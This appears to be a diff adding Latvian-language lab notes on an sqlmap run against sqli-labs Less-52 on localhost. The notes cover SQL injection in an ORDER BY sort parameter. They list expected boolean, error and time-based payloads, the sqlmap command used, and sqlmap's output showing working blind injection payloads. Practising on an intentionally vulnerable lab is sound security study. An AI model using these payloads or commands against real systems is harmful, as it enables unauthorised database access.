@@ -1,0 +1,31 @@
+=================================================================================
+1. Īpašība: injicets tiek "order by" klauzulā
+2. Nepiciešams tampering: nē
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: ?sort=-1 or 1=1
+3.2. error-based: ?sort=-1'
+3.3. time-based: ?sort=-1 or sleep(1)
+3.4. union: -
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums:  nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://localhost/sqli-labs/sqli-labs/Less-52/?sort=-1" -p sort --risk=3 --level=5 
+
+7. Jautājumi, kurus uzdeva SQLMap
+7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.2. injection not exploitable with NULL values. Do you want to try with a random integer vavlue for option '--union-char'? [Y/n] y
+7.3. it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 785 HTTP(s) requests:
+---
+Parameter: sort (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: sort=-1 AND 6086=(SELECT (CASE WHEN (6086=6086) THEN 6086 ELSE (SELECT 9122 UNION SELECT 7500) END))-- hNZq
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: sort=-1 AND (SELECT 2161 FROM (SELECT(SLEEP(5)))hpXM)
+---
+web application technology: PHP 5.6.40, Apache 2.4.38
+back-end DBMS: MySQL >= 5.0.12
